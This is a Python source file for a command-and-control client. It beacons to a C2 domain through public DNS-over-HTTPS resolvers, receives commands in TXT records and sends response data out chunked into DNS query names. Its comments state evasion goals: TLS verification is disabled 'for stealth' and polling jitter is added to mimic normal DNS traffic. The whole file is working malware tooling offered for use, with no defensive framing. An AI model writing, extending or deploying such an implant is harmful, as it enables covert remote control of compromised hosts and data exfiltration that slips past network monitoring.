#!/usr/bin/env python3
"""
DNS-over-HTTPS (DoH) Client Module
Handles communication with C2 server via DNS-over-HTTPS protocol
"""

import base64
import json
import random
import time
import urllib.parse
import urllib.request
import ssl
import struct

# Common DoH endpoints
DOH_ENDPOINTS = [
    "https://cloudflare-dns.com/dns-query",
    "https://dns.google/dns-query",
    "https://1.1.1.1/dns-query",
]


class DoHClient:
    """DNS-over-HTTPS client for C2 communication."""
    
    def __init__(self, domain, session_id=None, doh_endpoint=None):
        """
        Initialize DoH client.
        
        Args:
            domain: C2 domain name (e.g., "example.com")
            session_id: Existing session ID (for reconnection)
            doh_endpoint: Custom DoH endpoint URL (optional)
        """
        self.domain = domain
        self.session_id = session_id or self._generate_session_id()
        self.doh_endpoint = doh_endpoint or random.choice(DOH_ENDPOINTS)
        self.base_delay = 30  # Base polling interval in seconds
        self.max_chunk_size = 60  # Max DNS label length (63 - safety margin)
        
    def _generate_session_id(self):
        """Generate cryptographically random session ID."""
        import secrets
        return base64.urlsafe_b64encode(secrets.token_bytes(16)).decode('ascii').rstrip('=')
    
    def _make_doh_query(self, query_name, query_type="TXT"):
        """
        Make DNS-over-HTTPS query.
        
        Args:
            query_name: DNS query name
            query_type: DNS query type (default: TXT)
            
        Returns:
            List of response strings or None on error
        """
        try:
            # Build DoH query URL
            params = {
                "name": query_name,
                "type": query_type
            }
            url = f"{self.doh_endpoint}?{urllib.parse.urlencode(params)}"
            
            # Create request with headers
            req = urllib.request.Request(
                url,
                headers={
                    "Accept": "application/dns-json",
                    "User-Agent": "Mozilla/5.0 (compatible; DNS-over-HTTPS)"
                }
            )
            
            # Create SSL context (no verification for stealth)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            # Make request
            with urllib.request.urlopen(req, timeout=10, context=ctx) as response:
                data = json.loads(response.read().decode('utf-8'))
                
                # Extract TXT record data
                if 'Answer' in data:
                    results = []
                    for answer in data['Answer']:
                        if answer.get('type') == 16:  # TXT record
                            # TXT records are returned as quoted strings
                            txt_data = answer.get('data', '').strip('"')
                            results.append(txt_data)
                    return results if results else None
                return None
                
        except Exception as e:
            return None
    
    def _encode_data(self, data):
        """
        Encode data for DNS transmission.
        
        Args:
            data: String or bytes to encode
            
        Returns:
            Base64-encoded string safe for DNS labels
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # Base64 encode
        encoded = base64.urlsafe_b64encode(data).decode('ascii').rstrip('=')
        
        # Replace characters that might cause issues
        encoded = encoded.replace('+', '-').replace('/', '_')
        
        return encoded
    
    def _decode_data(self, encoded_data):
        """
        Decode data from DNS transmission.
        
        Args:
            encoded_data: Base64-encoded string
            
        Returns:
            Decoded bytes
        """
        try:
            # Restore base64 padding if needed
            padding = 4 - (len(encoded_data) % 4)
            if padding != 4:
                encoded_data += '=' * padding
            
            # Restore characters
            encoded_data = encoded_data.replace('-', '+').replace('_', '/')
            
            return base64.urlsafe_b64decode(encoded_data)
        except Exception:
            return b''
    
    def _split_into_chunks(self, data, chunk_size=None):
        """
        Split data into DNS-safe chunks.
        
        Args:
            data: String to split
            chunk_size: Maximum chunk size (default: self.max_chunk_size)
            
        Returns:
            List of chunks
        """
        if chunk_size is None:
            chunk_size = self.max_chunk_size
        
        encoded = self._encode_data(data)
        chunks = []
        
        for i in range(0, len(encoded), chunk_size):
            chunks.append(encoded[i:i + chunk_size])
        
        return chunks
    
    def _build_query_name(self, chunk_id, data_chunk, message_type="cmd"):
        """
        Build DNS query name from data.
        
        Format: {message_type}.{chunk_id}.{data}.{session_id}.{domain}
        
        Args:
            chunk_id: Chunk identifier
            data_chunk: Data chunk to encode
            message_type: Type of message ("cmd" for command, "resp" for response)
            
        Returns:
            DNS query name
        """
        # Clean session ID for DNS (remove special chars)
        clean_session = self.session_id.replace('=', '').replace('+', '-').replace('/', '_')[:16]
        
        query_parts = [
            message_type,
            str(chunk_id),
            data_chunk,
            clean_session,
            self.domain
        ]
        
        return '.'.join(query_parts)
    
    def send_response(self, response_data):
        """
        Send response to C2 server.
        
        Args:
            response_data: Response data (string or bytes)
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if isinstance(response_data, bytes):
                response_data = response_data.decode('utf-8', errors='ignore')
            
            # Split into chunks
            chunks = self._split_into_chunks(response_data)
            
            # Send each chunk
            for i, chunk in enumerate(chunks):
                query_name = self._build_query_name(i, chunk, "resp")
                result = self._make_doh_query(query_name)
                
                # Add small delay between chunks
                if i < len(chunks) - 1:
                    time.sleep(0.1)
            
            return True
            
        except Exception:
            return False
    
    def get_command(self):
        """
        Poll C2 server for commands.
        
        Returns:
            Command string or None if no command available
        """
        try:
            # Build beacon query
            query_name = self._build_query_name(0, "beacon", "cmd")
            
            # Make DoH query
            results = self._make_doh_query(query_name)
            
            if not results:
                return None
            
            # Decode command from first TXT record
            if results:
                try:
                    # Try to decode as JSON first
                    decoded = self._decode_data(results[0])
                    command_data = json.loads(decoded.decode('utf-8'))
                    
                    if command_data.get('session_id') == self.session_id:
                        return command_data.get('command')
                except Exception:
                    # Fallback: try direct decode
                    decoded = self._decode_data(results[0])
                    return decoded.decode('utf-8', errors='ignore')
            
            return None
            
        except Exception:
            return None
    
    def get_polling_delay(self):
        """
        Get polling delay with jitter to mimic normal DNS behavior.
        
        Returns:
            Delay in seconds
        """
        jitter = random.uniform(0.8, 1.2)  # ±20% jitter
        return int(self.base_delay * jitter)

